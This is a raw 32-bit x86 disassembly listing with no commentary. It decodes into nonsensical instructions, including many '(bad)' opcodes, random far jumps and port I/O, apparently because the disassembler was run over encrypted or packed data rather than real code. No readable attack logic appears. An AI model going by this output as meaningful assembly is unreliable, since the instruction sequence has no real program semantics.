  4223c5:	mov    bl,0x9b
  4223c7:	loop   0x4223be
  4223c9:	clc    
  4223ca:	jmp    0x9a50:0x40c52ead
  4223d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223d2:	xchg   ebx,eax
  4223d3:	clc    
  4223d4:	ins    BYTE PTR es:[edi],dx
  4223d5:	std    
  4223d6:	(bad)  
  4223d7:	cmp    DWORD PTR [ebp+0x2f5b28c8],esi
  4223dd:	in     al,dx
  4223de:	sbb    eax,0x2e7e6107
  4223e3:	cld    
  4223e4:	aad    0x2a
  4223e6:	sar    ebp,0x25
  4223e9:	push   ebx
  4223ea:	jp     0x422429
  4223ec:	lods   eax,DWORD PTR ds:[esi]
  4223ed:	sbb    eax,0x874f4e84
  4223f2:	push   esp
  4223f3:	icebp  
  4223f4:	xchg   ecx,eax
  4223f5:	dec    edx
  4223f6:	xor    DWORD PTR [ebx-0x2ff33dd0],0x2904c421
  422400:	loope  0x4223cc
  422402:	fdivr  st(2),st
  422404:	pop    esp
  422405:	dec    edx
  422406:	(bad)  
  422408:	sub    dl,BYTE PTR [esi+0x36483fa5]
  42240e:	mov    dl,0xb6
  422410:	loope  0x4223fa
  422412:	mov    ch,0x12
  422414:	imul   ebx,edi,0xffffffda
  422417:	sub    al,0x4d
  422419:	mov    ch,0x4
  42241b:	fcmovnbe st,st(5)
  42241d:	shl    DWORD PTR [ebx+0x17b4a178],cl
  422423:	dec    eax
  422424:	inc    ecx
  422425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422426:	call   0x804a3cb9
  42242b:	repz neg BYTE PTR [ecx+0x5a2acf2d]
  422432:	into   
  422433:	cmp    eax,ebx
  422435:	pop    eax
  422436:	jp     0x4224a5
  422438:	inc    esi
  422439:	sub    ah,cl
  42243b:	cmp    al,0xc7
  42243d:	ja     0x42243e
  42243f:	and    BYTE PTR [edi+0x16d6799c],0xbe
  422446:	xor    ebx,DWORD PTR [ebp-0x17a854b6]
  42244c:	add    eax,ebx
  42244e:	jae    0x4224c2
  422450:	sub    eax,0xd6eb975
  422455:	rcr    BYTE PTR [edx],1
  422457:	imul   ebp,DWORD PTR [edi+edx*1+0x1d],0xe8210f95
  42245f:	jl     0x422417
  422461:	add    eax,0x7d822e2c
  422466:	dec    ecx
  422467:	pusha  
  422468:	mov    eax,ebx
  42246a:	xor    esi,DWORD PTR [esp+ecx*2+0x76e139d9]
  422471:	js     0x4224c5
  422473:	push   0x6f
  422475:	xor    DWORD PTR [eax+0x6571047f],ecx
  42247b:	outs   dx,BYTE PTR ds:[esi]
  42247c:	ja     0x4224d3
  42247e:	cmp    eax,0x19e97cb8
  422483:	xchg   ebp,eax
  422484:	dec    eax
  422485:	or     ebp,ecx
  422487:	(bad)  
  422489:	jmp    DWORD PTR [esi+0x43]
  42248c:	pusha  
  42248d:	data16 xor al,0x3d
  422490:	outs   dx,DWORD PTR ds:[esi]
  422491:	dec    ebx
  422492:	repnz sbb BYTE PTR fs:[ebx-0x70],bl
  422497:	xor    dh,al
  422499:	iret   
  42249a:	mov    ebx,0x9abf0819
  42249f:	sbb    BYTE PTR [eax+0x2063a604],dh
  4224a5:	push   cs
  4224a6:	xchg   ebx,eax
  4224a7:	jecxz  0x422469
  4224a9:	lods   eax,DWORD PTR ds:[esi]
  4224aa:	jnp    0x42246e
  4224ac:	cld    
  4224ad:	inc    edi
  4224ae:	jge    0x42243c
  4224b0:	xchg   edx,eax
  4224b1:	jb     0x4224bb
  4224b3:	mov    edi,DWORD PTR [ebp-0x38efda2d]
  4224b9:	add    DWORD PTR [eax],eax
  4224bb:	mov    dl,0x68
  4224bd:	out    dx,eax
  4224be:	sbb    bh,BYTE PTR [esi-0x71825fb8]
  4224c4:	and    eax,0xe7deae58
  4224c9:	daa    
  4224ca:	or     BYTE PTR [esi-0x15],cl
  4224cd:	sub    esi,DWORD PTR [ecx]
  4224cf:	outs   dx,DWORD PTR ds:[esi]
  4224d0:	addr16 jmp 0x422507
  4224d3:	test   DWORD PTR [ecx+0x41],ecx
  4224d6:	repnz add ecx,DWORD PTR [edx+esi*4]
  4224da:	xchg   edi,eax
  4224db:	jmp    0xefcefc16
  4224e0:	imul   ecx,esp,0xf300f7ab
  4224e6:	lock xor edi,esp
  4224e9:	or     ecx,DWORD PTR ds:0xfaf9e4b
  4224ef:	out    0x8e,eax
  4224f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224f2:	mov    edi,0xf7925580
  4224f7:	retf   0x5f2
  4224fa:	sti    
  4224fb:	pop    edx
  4224fc:	aad    0x86
  4224fe:	xchg   esi,eax
  4224ff:	sub    eax,0x6576caea
  422504:	out    dx,eax
  422505:	nop
  422506:	dec    esp
  422507:	mov    esp,DWORD PTR [eax-0x1e6e036d]
  42250d:	push   ebx
  42250e:	mov    dh,BYTE PTR [ebx-0xd]
  422511:	mov    eax,ebp
  422513:	fsubr  QWORD PTR [ebp-0x48]
  422516:	int    0xc1
  422518:	ficomp DWORD PTR [ebx+0x7594110e]
  42251e:	gs repnz inc eax
  422521:	pop    eax
  422522:	push   esp
  422523:	and    eax,eax
  422525:	fsubp  st(0),st
  422527:	xchg   ecx,eax
  422528:	test   al,0xb
  42252a:	jp     0x422502
  42252c:	sbb    eax,esi
  42252e:	(bad)  
  42252f:	cli    
  422530:	scas   eax,DWORD PTR es:[edi]
  422531:	xchg   edi,eax
  422532:	or     BYTE PTR [edi+ebx*1+0x7d],ah
  422536:	xor    DWORD PTR [ecx],ebx
  422538:	arpl   WORD PTR [edx],di
  42253a:	(bad)  [ecx]
  42253c:	stc    
  42253d:	(bad)  
  42253e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42253f:	outs   dx,BYTE PTR ds:[esi]
  422540:	xchg   edx,eax
  422541:	sub    al,0xad
  422543:	mov    ah,0xa9
  422545:	xchg   esp,eax
  422546:	mov    esi,0x63efb43f
  42254b:	xchg   edi,eax
  42254c:	add    BYTE PTR [eax],bl
  42254e:	jno    0x4224fc
  422550:	es jge 0x42250e
  422553:	inc    edi
  422554:	loop   0x42256d
  422556:	rcr    BYTE PTR [ebx+0x6cdfae5e],0xce
  42255d:	mov    ebx,0x86a78f49
  422562:	mov    cs,WORD PTR [ebx+0x1f]
  422565:	aaa    
  422566:	lds    ebx,FWORD PTR [edi-0x38025a9a]
  42256c:	int    0x38
  42256e:	retf   0x43bc
  422571:	and    BYTE PTR [ebx+esi*4],dl
  422574:	mov    ch,BYTE PTR [ecx]
  422576:	inc    ebp
  422577:	test   DWORD PTR [eax-0x2646fa4d],esp
  42257d:	int3   
  42257e:	pop    edx
  42257f:	sbb    eax,0x922b5866
  422584:	jns    0x4225b2
  422586:	ret    
  422587:	and    al,0x1a
  422589:	jp     0x42257a
  42258b:	xchg   ecx,eax
  42258c:	xor    BYTE PTR [ebx],cl
  42258e:	scas   al,BYTE PTR es:[edi]
  42258f:	lds    edi,FWORD PTR [esi+0x1f38778e]
  422595:	and    DWORD PTR [esi+0x6a1c026f],edx
  42259b:	inc    eax
  42259c:	test   ch,dl
  42259e:	adc    eax,DWORD PTR [esi-0x6df4e618]
  4225a4:	jp     0x422570
  4225a6:	ror    ecx,0x51
  4225a9:	in     eax,0x6e
  4225ab:	sete   BYTE PTR [edi-0x3]
  4225af:	add    eax,0x47c74aa3
  4225b4:	cmp    cl,ah
  4225b6:	repz fstp DWORD PTR [edx-0x696609b2]
  4225bd:	cs ins DWORD PTR es:[edi],dx
  4225bf:	daa    
  4225c0:	push   edi
  4225c1:	xchg   ebp,eax
  4225c2:	xor    edi,DWORD PTR [ebx-0x6a89ca11]
  4225c8:	xchg   ebp,eax
  4225c9:	fadd   QWORD PTR [edx-0x4dc7a4bf]
  4225cf:	aas    
  4225d0:	pop    ebx
  4225d1:	jmp    0x59caaac9
  4225d6:	mov    ecx,0x8c37c44e
  4225db:	xchg   ebp,eax
  4225dc:	and    eax,0xb077cc54
  4225e1:	call   0xc1d8:0xe74689d3
  4225e8:	adc    eax,0x4675beb9
  4225ed:	out    dx,eax
  4225ee:	push   edi
  4225ef:	xchg   esi,eax
  4225f0:	add    al,0x5b
  4225f2:	push   edx
  4225f3:	(bad)  
  4225f4:	jmp    0x5523:0x125b7399
  4225fb:	add    ah,al
  4225fd:	test   eax,0xa27b6a0b
  422602:	mov    esp,0x2ea7b29b
  422607:	dec    ebx
  422608:	inc    edx
  422609:	popa   
  42260a:	arpl   WORD PTR [edx+0x264df490],cx
  422610:	xor    DWORD PTR [ecx-0x34],edi
  422613:	jmp    0x422676
  422615:	in     al,0xd7
  422617:	ins    DWORD PTR es:[edi],dx
  422618:	stc    
  422619:	clc    
  42261a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261b:	scas   al,BYTE PTR es:[edi]
  42261c:	jbe    0x4225c3
  42261e:	mov    ebx,0xace0e353
  422623:	rcl    DWORD PTR [edx],cl
  422625:	jmp    0x42264c
  422627:	xchg   esi,eax
  422628:	imul   eax,DWORD PTR [eax],0x91d6d117
  42262e:	das    
  42262f:	aad    0x4f
  422631:	(bad)  [eax]
  422633:	fldenv [eax-0x61]
  422636:	xor    al,BYTE PTR [ebp+0x88e7f73]
  42263c:	mov    dh,0xae
  42263e:	xor    al,0xb0
  422640:	adc    ah,BYTE PTR ds:0x20c8e4f
  422646:	dec    eax
  422647:	and    al,0xab
  422649:	mov    esp,0xfb62aadc
  42264e:	mov    bh,0x14
  422650:	jge    0x4226c0
  422652:	mov    al,ds:0x65abad2d
  422657:	push   ecx
  422658:	fadd   QWORD PTR [ecx-0x6988ef62]
  42265e:	ins    BYTE PTR es:[edi],dx
  42265f:	ror    DWORD PTR [edi-0x3cc25474],cl
  422665:	push   ebx
  422666:	or     al,0xac
  422668:	inc    edi
  422669:	add    DWORD PTR [ecx+0x28b648c],eax
  42266f:	int    0x65
  422671:	jne    0x4226e6
  422673:	mov    edx,0xc4bcdff3
  422678:	fdivr  DWORD PTR [esp+ebp*2]
  42267b:	sahf   
  42267c:	(bad)  
  42267d:	fucomip st,st(0)
  42267f:	stos   DWORD PTR es:[edi],eax
  422680:	ds fwait
  422682:	adc    al,0x2c
  422684:	and    al,0xd5
  422686:	mov    gs,WORD PTR [ecx+0x216be5d2]
  42268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42268d:	add    DWORD PTR [ebx+edi*1-0x6f578be6],esi
  422694:	stos   DWORD PTR es:[edi],eax
  422695:	daa    
  422696:	pushf  
  422697:	jl     0x422658
  422699:	cs loopne 0x422646
  42269c:	retf   
  42269d:	imul   ebp,ebp,0xeb8a2c90
  4226a3:	fs mov ah,0x26
  4226a6:	mov    DWORD PTR [ebx+eax*4],esp
  4226a9:	(bad)  
  4226aa:	test   eax,0xcf0b6c7d
  4226af:	mov    ds:0xe4604a9e,al
  4226b4:	inc    ebx
  4226b5:	fiadd  WORD PTR [eax+0x78]
  4226b8:	dec    DWORD PTR [edx+0x23]
  4226bb:	shl    DWORD PTR [esi],0xf3
  4226be:	and    dl,BYTE PTR [ebp-0x6c7c281a]
  4226c4:	sub    al,0x5b
  4226c6:	imul   eax,DWORD PTR [ebx+0x16f9a292],0x62
  4226cd:	outs   dx,DWORD PTR ds:[esi]
  4226ce:	mov    DWORD PTR [edx-0x19c9119e],esi
  4226d4:	mov    edi,0x13f99407
  4226d9:	push   ebx
  4226da:	xchg   ebp,eax
  4226db:	and    ch,bh
  4226dd:	pop    es
  4226de:	ficomp WORD PTR [eax]
  4226e0:	out    dx,al
  4226e1:	cmc    
  4226e2:	jne    0x4226e5
  4226e4:	inc    esp
  4226e5:	std    
  4226e6:	mov    dl,0x95
  4226e8:	pop    ss
  4226e9:	sub    ebx,DWORD PTR [ecx-0x4a]
  4226ec:	jmp    0x6112:0x97fda6
  4226f3:	(bad)  
  4226f4:	adc    eax,DWORD PTR [esi]
  4226f6:	repz (bad) 
  4226f9:	in     eax,0x73
  4226fb:	out    dx,al
  4226fc:	retf   
  4226fd:	xchg   edi,eax
  4226fe:	out    dx,eax
  4226ff:	mov    es:0x6d6c1715,al
  422705:	lods   al,BYTE PTR ds:[esi]
  422706:	adc    ch,bh
  422708:	out    dx,eax
  422709:	or     eax,DWORD PTR [edi+0xd410b1]
  42270f:	nop
  422710:	mov    WORD PTR [ebp-0x5691515d],?
  422716:	into   
  422717:	test   BYTE PTR [edx+0x47],bl
  42271a:	and    BYTE PTR [edx-0xb135508],bh
  422720:	and    al,0x83
  422723:	cli    
  422724:	scas   eax,DWORD PTR es:[edi]
  422725:	dec    esi
  422726:	test   DWORD PTR [edx+0x130400c8],esp
  42272c:	stos   BYTE PTR es:[edi],al
  42272d:	lahf   
  42272e:	sub    ebx,edx
  422730:	xchg   ebx,eax
  422731:	xchg   ebx,eax
  422732:	loopne 0x4227b1
  422734:	push   cs
  422735:	retf   
  422736:	outs   dx,DWORD PTR ds:[esi]
  422737:	lds    ebx,FWORD PTR [eax*8-0x4dff6564]
  42273e:	jmp    0xc9605f07
  422743:	jmp    0x422794
  422745:	out    dx,eax
  422746:	sbb    al,0xbb
  422748:	sbb    DWORD PTR [eax],eax
  42274a:	in     al,dx
  42274b:	outs   dx,BYTE PTR ds:[esi]
  42274c:	push   edi
  42274d:	sti    
  42274e:	push   ss
  42274f:	inc    edi
  422750:	mov    WORD PTR [ecx-0x38],?
  422753:	sbb    bh,BYTE PTR [edi+0x7a38e946]
  422759:	push   ecx
  42275a:	dec    esi
  42275b:	push   DWORD PTR [esi+0x50]
  42275e:	repnz push ecx
  422760:	lds    ebp,FWORD PTR [edx]
  422762:	bound  edi,QWORD PTR [eax+0x8]
  422765:	out    dx,al
  422766:	(bad)  
  422768:	cld    
  422769:	dec    esi
  42276a:	lea    ebp,[ebx-0x7d]
  42276d:	xchg   BYTE PTR [esi],ch
  42276f:	xchg   edx,eax
  422770:	xchg   esi,eax
  422771:	xchg   ebp,eax
  422772:	push   ss
  422773:	and    DWORD PTR [edi],0xffffffd8
  422776:	add    BYTE PTR [eax-0x51],bl
  422779:	xor    dl,cl
  42277b:	push   esi
  42277c:	dec    ebp
  42277d:	xchg   edx,eax
  42277e:	and    BYTE PTR [edx],dl
  422780:	call   FWORD PTR [edx]
  422782:	jae    0x422750
  422784:	mov    al,0x40
  422786:	sti    
  422787:	cmp    eax,0x75adf36
  42278c:	js     0x422716
  42278e:	ret    0x240a
  422791:	mov    eax,ds:0xf5fe284c
  422796:	xchg   esp,eax
  422797:	mov    bl,0xd5
  422799:	fwait
  42279a:	test   eax,0xa1f96e98
  42279f:	push   ds
  4227a0:	adc    BYTE PTR [ebp+edi*4+0x69],bl
  4227a4:	fmul   st(2),st
  4227a6:	and    eax,0xe3261684
  4227ab:	je     0x422754
  4227ad:	xor    eax,ebx
  4227af:	push   ss
  4227b0:	fimul  DWORD PTR [esi+0x62]
  4227b3:	add    al,bh
  4227b5:	rol    edx,0xe4
  4227b8:	mov    edi,0x2bbd49a8
  4227bd:	ja     0x4227d3
  4227bf:	inc    eax
  4227c0:	push   0x2eb92985
  4227c5:	shr    DWORD PTR [edx],1
  4227c7:	pushf  
  4227c8:	sbb    al,0xa3
  4227ca:	loopne 0x422772
  4227cc:	cmp    ecx,DWORD PTR [esi]
  4227ce:	and    eax,0x2fb44df3
  4227d3:	or     BYTE PTR [edi-0x6bf661d1],ch
  4227d9:	aaa    
  4227da:	xchg   ecx,eax
  4227db:	xor    ecx,DWORD PTR [ebx+0x73ca2b46]
  4227e1:	inc    ecx
  4227e2:	les    ebp,FWORD PTR [edx]
  4227e4:	sahf   
  4227e5:	mov    eax,0x1f524be4
  4227ea:	cmp    al,dl
  4227ec:	sbb    ebp,DWORD PTR [esi-0x23344e60]
  4227f2:	mov    ebx,0x60ff6c76
  4227f7:	pop    ebp
  4227f8:	and    BYTE PTR [ebx+0x4a],bl
  4227fb:	sbb    al,0x62
  4227fd:	add    BYTE PTR [eax],dh
  4227ff:	nop
  422800:	call   0x1be4d1ba
  422805:	adc    esp,esi
  422807:	out    0xbe,eax
  422809:	xor    al,0xab
  42280b:	out    0x59,eax
  42280d:	push   0xbce69327
  422812:	test   al,0x4a
  422814:	mov    cl,0xc4
  422816:	mov    eax,0xe650e9f1
  42281b:	lahf   
  42281c:	or     al,cl
  42281e:	es jp  0x422877
  422821:	cmp    al,0xe3
  422823:	cs call 0x510:0xcfd04277
  42282b:	mov    ds:0xf65650f5,eax
  422830:	adc    DWORD PTR [esi+0x7b],edx
  422833:	pushf  
  422834:	inc    esp
  422835:	cmp    DWORD PTR [eax+0x71],edx
  422838:	iret   
  422839:	pop    ds
  42283a:	add    DWORD PTR [ebp+0x3f19cf27],0x5db31b5c
  422844:	test   BYTE PTR [eax],ah
  422846:	rcr    BYTE PTR gs:[esi-0x59],0xa0
  42284b:	stos   DWORD PTR es:[edi],eax
  42284c:	inc    esi
  42284d:	pop    eax
  42284e:	cmp    eax,0xe64f6a47
  422853:	cmp    al,0x26
  422855:	jno    0x4227e2
  422857:	pusha  
  422858:	sub    esi,esp
  42285a:	ss jmp 0x4227fb
  42285d:	push   ebp
  42285e:	fwait
  42285f:	dec    edi
  422860:	push   ebx
  422861:	ins    BYTE PTR es:[edi],dx
  422862:	shl    BYTE PTR ds:0xe7dd73b7,cl
  422868:	sbb    BYTE PTR [esi-0x43b5132e],bh
  42286e:	xchg   esp,eax
  42286f:	sub    al,0x7d
  422871:	jb     0x4228df
  422873:	jmp    0x4228e1
  422875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422876:	loopne 0x422856
  422878:	enter  0x2f18,0xc9
  42287c:	jb     0x4228fd
  42287e:	xor    al,0xe9
  422880:	or     esp,DWORD PTR [ebx-0x3ff9db94]
  422886:	imul   ebp,DWORD PTR [edi-0x6153ccb8],0x39
  42288d:	fdivr  DWORD PTR [eax]
  42288f:	mov    esi,0x93d37003
  422894:	lods   eax,DWORD PTR ds:[esi]
  422895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422896:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422897:	inc    edi
  422898:	sahf   
  422899:	sub    eax,0xd29f1e12
  42289e:	rcr    ch,cl
  4228a0:	clc    
  4228a1:	stos   BYTE PTR es:[edi],al
  4228a2:	lock mov ch,0x25
  4228a5:	cmp    eax,0x580ba3c
  4228aa:	mov    ds:0x5d58b476,eax
  4228af:	sub    esi,DWORD PTR [edi]
  4228b1:	push   ecx
  4228b2:	iret   
  4228b3:	jmp    0x45627bd7
  4228b8:	or     eax,0x86a2b41e
  4228bd:	jle    0x422848
  4228bf:	adc    al,0x93
  4228c1:	in     eax,0xae
  4228c3:	das    
  4228c4:	aad    0xd
  4228c6:	jl     0x4228fb
  4228c8:	test   DWORD PTR [ecx+0x4d901b43],0xc5519163
  4228d2:	add    DWORD PTR [esi*8-0x57e9e818],edx
  4228d9:	std    
  4228da:	adc    esi,DWORD PTR [eax+edx*1]
  4228dd:	xchg   esi,eax
  4228de:	sub    DWORD PTR ds:0xb4d6531c,esi
  4228e4:	aad    0xdd
  4228e6:	xchg   edi,eax
  4228e7:	fs mov ah,0x20
  4228ea:	mov    BYTE PTR [ecx+0x7e0ca69d],bh
  4228f0:	ror    al,1
  4228f2:	(bad)  
  4228f3:	jmp    0x92d7:0x91ac82f9
  4228fa:	sbb    ecx,DWORD PTR [ebp-0x4b]
  4228fd:	jb     0x4228e9
  4228ff:	aad    0x7a
  422901:	fsubr  DWORD PTR [edi-0x79819e8b]
  422907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422908:	mov    cs,esp
  42290a:	pop    ecx
  42290b:	xor    BYTE PTR [esi],0x32
  42290e:	xor    al,0x39
  422910:	test   BYTE PTR [esi+esi*2+0x2f79b0a7],dl
  422917:	xor    DWORD PTR [edx+0x3db8ac17],ebp
  42291d:	xchg   edi,eax
  42291e:	mov    DWORD PTR [esp+ecx*2+0x7846efa4],esp
  422925:	pop    ecx
  422926:	lock mov DWORD PTR [ecx],esp
  422929:	call   FWORD PTR [ecx+0x7f]
  42292c:	sub    eax,0x29ab055d
  422931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422932:	xor    al,0xdb
  422934:	call   0x6b816d94
  422939:	cmp    al,0x81
  42293b:	test   DWORD PTR [eax-0x6581ba37],ecx
  422941:	pop    eax
  422942:	cmp    bl,BYTE PTR [ecx]
  422944:	jno    0x422983
  422946:	push   ss
  422947:	inc    esp
  422948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422949:	pop    ss
  42294a:	push   ds
  42294b:	or     ch,0xb3
  42294e:	and    eax,0x24f94011
  422953:	jmp    0x8347:0x5f260e53
  42295a:	xchg   BYTE PTR [edx-0x5d],al
  42295d:	scas   al,BYTE PTR es:[edi]
  42295e:	imul   edi,DWORD PTR [edi],0xf56fe43e
  422964:	push   edx
  422965:	xchg   ebp,eax
  422966:	clc    
  422967:	mov    DWORD PTR [ebx+0x13088dce],esp
  42296d:	ds jle 0x42290c
  422970:	fcomp  QWORD PTR [edi-0x41]
  422973:	jg     0x422989
  422975:	xor    al,0x1
  422977:	popf   
  422978:	mov    bh,0x3e
  42297a:	xchg   ecx,eax
  42297b:	imul   ebp,ebp,0xfffffffa
  42297e:	inc    edx
  42297f:	sub    ah,bl
  422981:	pop    edx
  422982:	cmp    eax,0xf083fd24
  422987:	xchg   edx,eax
  422988:	xor    cl,BYTE PTR [esi-0x53ec3259]
  42298e:	sbb    al,0x7f
  422990:	call   0xc4d39da5
  422995:	sub    al,0x5d
  422997:	mov    esp,0x2ff35b7a
  42299c:	inc    ebx
  42299d:	ja     0x4229da
  42299f:	scas   al,BYTE PTR es:[edi]
  4229a0:	enter  0x5ce9,0x98
  4229a4:	popf   
  4229a5:	icebp  
  4229a6:	(bad)
  4229aa:	or     eax,0x8709183d
  4229af:	mov    fs,WORD PTR [edx+edi*4]
  4229b2:	add    edx,DWORD PTR [ebp-0x36]
  4229b5:	mov    ds:0x35dd89c7,eax
  4229ba:	iret   
  4229bb:	mov    dh,0xed
  4229be:	popf   
  4229bf:	cmp    ebp,DWORD PTR [eax+0x36996e2f]
  4229c5:	jo     0x42294c
  4229c7:	into   
  4229c8:	push   0xc59d4ae9
  4229cd:	adc    ch,BYTE PTR ds:0x15bc7786
  4229d3:	cmp    ebx,DWORD PTR [eax-0x2c]
  4229d6:	mov    cl,0x33
  4229d8:	(bad)  
  4229d9:	xor    dl,cl
  4229db:	pushf  
  4229dc:	sbb    al,0x71
  4229de:	and    ch,BYTE PTR [ecx]
  4229e0:	(bad)  
  4229e1:	retf   
  4229e2:	imul   edi,DWORD PTR [edi+0x54],0x2d6ed35b
  4229e9:	ds cs jne 0x422972
  4229ed:	xchg   ebx,eax
  4229ee:	mov    DWORD PTR [esi],ecx
  4229f0:	push   ecx
  4229f1:	faddp  st(7),st
  4229f3:	fadd   st,st(2)
  4229f5:	repz and ah,BYTE PTR [esi-0x36]
  4229f9:	xchg   DWORD PTR [edi-0xb],eax
  4229fc:	jg     0x422a79
  4229fe:	xchg   BYTE PTR [edx],bh
  422a00:	push   edi
  422a01:	das    
  422a02:	popf   
  422a03:	iret   
  422a04:	mov    bh,ah
  422a06:	mov    al,BYTE PTR [esi+ebx*8+0x4]
  422a0a:	dec    edx
  422a0b:	pop    esi
  422a0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a0d:	push   ecx
  422a0e:	pop    ecx
  422a0f:	pop    esi
  422a10:	sub    esp,ebx
  422a12:	iret   
  422a13:	mov    al,0x18
  422a15:	jmp    0x98819669
  422a1a:	fdivr  DWORD PTR [edi+0x1bef4fb9]
  422a20:	push   ebp
  422a21:	in     al,dx
  422a22:	test   al,0x2e
  422a24:	out    dx,al
  422a25:	xor    esi,DWORD PTR [edx]
  422a27:	ret    
  422a28:	shr    esp,cl
  422a2a:	mov    eax,DWORD PTR [edi-0x35377d07]
  422a30:	(bad)  
  422a31:	pop    esi
  422a32:	stos   BYTE PTR es:[edi],al
  422a33:	push   0x809cdec7
  422a38:	call   0xc47b8a0c
  422a3d:	lods   eax,DWORD PTR ds:[esi]
  422a3e:	rol    dl,1
  422a40:	out    0x69,al
  422a42:	fdivr  st(5),st
  422a44:	stc    
  422a45:	cmp    BYTE PTR [esi+0x53],ch
  422a48:	popf   
  422a49:	sti    
  422a4a:	cmp    edx,DWORD PTR [edx-0x2252935d]
  422a50:	and    al,0x7e
  422a52:	sti    
  422a53:	arpl   WORD PTR [ecx+0x39],sp
  422a56:	dec    ebx
  422a57:	inc    esi
  422a58:	loopne 0x422abc
  422a5a:	sbb    BYTE PTR [ebp+0x66],cl
  422a5d:	pop    edi
  422a5e:	jmp    0x4c6e:0x6ac587a4
  422a65:	pop    eax
  422a66:	sbb    ch,bl
  422a68:	outs   dx,DWORD PTR ds:[esi]
  422a69:	inc    ecx
  422a6a:	fcom   DWORD PTR [edi+0x6d]
  422a6d:	lods   eax,DWORD PTR ds:[esi]
  422a6e:	(bad)  
  422a6f:	aaa    
  422a70:	mov    edx,0xcd6d20d3
  422a75:	xor    DWORD PTR [edi],ebx
  422a77:	adc    eax,0xfb2c2d34
  422a7c:	jae    0x422a7d
  422a7e:	sbb    BYTE PTR [ebp-0x9f5277b],cl
  422a84:	js     0x422a93
  422a86:	fdivrp st(3),st
  422a88:	fmul   st(5),st
  422a8a:	pop    esp
  422a8b:	adc    eax,DWORD PTR [eax-0x3885db99]
  422a91:	push   0x40
  422a93:	jae    0x422ad7
  422a95:	lea    esp,[ebx+0x4a]
  422a98:	sub    eax,0xbace0a46
  422a9d:	mov    al,0xd7
  422a9f:	jns    0x422a4d
  422aa1:	test   BYTE PTR [ebp-0x6fbc1f53],0x22
  422aa8:	push   esp
  422aa9:	jmp    0x9e62:0x664974bd
  422ab0:	sub    al,0xf6
  422ab2:	cmp    DWORD PTR [ebp+0x44],0x32150bba
  422ab9:	pop    ds
  422aba:	adc    eax,0x1cc3ef08
  422abf:	clc    
  422ac0:	xchg   DWORD PTR [edx+0x5b],esp
  422ac3:	add    DWORD PTR [esi-0x39b71385],0x509e7fe3
  422acd:	mov    esi,0x9a6551e
  422ad2:	stos   DWORD PTR es:[edi],eax
  422ad3:	stos   DWORD PTR es:[edi],eax
  422ad4:	adc    eax,0x6534e789
  422ad9:	sahf   
  422ada:	jo     0x422a9c
  422adc:	loop   0x422b13
  422ade:	or     al,0x31
  422ae0:	int3   
  422ae1:	mov    bl,0x4b
  422ae3:	test   ecx,ebp
  422ae5:	mov    esp,0x4b2cb919
  422aea:	popf   
  422aeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aec:	and    esp,DWORD PTR ds:0x9944de09
  422af2:	popf   
  422af3:	enter  0xf766,0xdf
  422af7:	loope  0x422aa2
  422af9:	std    
  422afa:	xchg   ebp,eax
  422afb:	cdq    
  422afc:	push   ss
  422afd:	dec    eax
  422afe:	std    
  422aff:	fild   DWORD PTR [edi-0x18]
  422b02:	mov    al,cs:0xd5b501e3
  422b08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b09:	add    eax,0xbd939e28
  422b0e:	in     al,dx
  422b0f:	(bad)  
  422b10:	std    
  422b11:	pusha  
  422b12:	push   0xffffff82
  422b14:	loop   0x422b67
  422b16:	pop    esi
  422b17:	dec    ebx
  422b18:	sbb    al,0xea
  422b1a:	fsub   DWORD PTR [ecx+0x45f4507]
  422b20:	or     eax,ebp
  422b22:	mov    ch,0x29
  422b24:	int    0x6d
  422b26:	nop
  422b27:	sub    DWORD PTR [ebx+0x520e87fc],edx
  422b2d:	test   al,0x47
  422b2f:	add    eax,0xfec38f93
  422b34:	sbb    dh,BYTE PTR [esi]
  422b36:	fistp  DWORD PTR [eax]
  422b38:	sub    al,0x30
  422b3a:	jmp    0xbced8ff
  422b3f:	not    DWORD PTR [esi+0x4c]
  422b42:	pop    edx
  422b43:	mov    edi,0x5bcf8bfd
  422b48:	ja     0x422aff
  422b4a:	mov    ecx,0xcd3ce0c4
  422b4f:	push   ebp
  422b50:	call   0x45dd:0xc566d9c7
  422b57:	sub    bh,BYTE PTR [edi+0x57433c8e]
  422b5d:	mov    ds:0xa1fda833,eax
  422b62:	jae    0x422ba7
  422b64:	and    dl,BYTE PTR [edi-0x3bddfe0c]
  422b6a:	xor    al,0x28
  422b6c:	push   edi
  422b6d:	lock xor eax,0x1e4c8e83
  422b73:	cmc    
  422b74:	hlt    
  422b75:	cli    
  422b76:	sbb    eax,0x938bb916
  422b7b:	mov    ds:0xb284c8e6,al
  422b80:	mov    ah,0x3
  422b82:	div    esp
  422b84:	rol    ch,0x21
  422b87:	push   0x5
  422b89:	aas    
  422b8a:	push   edx
  422b8b:	inc    edx
  422b8c:	jge    0x422b15
  422b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b8f:	mov    fs,WORD PTR [esi]
  422b91:	das    
  422b92:	imul   esp,edi,0xffffffe5
  422b95:	dec    eax
  422b96:	or     al,0xfb
  422b98:	xor    eax,0x13565887
  422b9d:	leave  
  422b9e:	pop    ecx
  422b9f:	jmp    0xa404:0xf4944947
  422ba6:	mov    cl,0x61
  422ba8:	pop    esp
  422ba9:	pmuludq mm7,QWORD PTR [ebx+ebx*1]
  422bad:	pop    es
  422bae:	sti    
  422baf:	mov    ebx,0x25e203ab
  422bb4:	das    
  422bb5:	(bad)  
  422bb6:	mov    WORD PTR [ecx-0x75],gs
  422bb9:	push   edx
  422bba:	dec    esp
  422bbb:	loope  0x422b60
  422bbd:	inc    edi
  422bbe:	dec    ecx
  422bbf:	pop    edi
  422bc0:	xor    BYTE PTR [edx],ch
  422bc2:	test   DWORD PTR [edi],eax
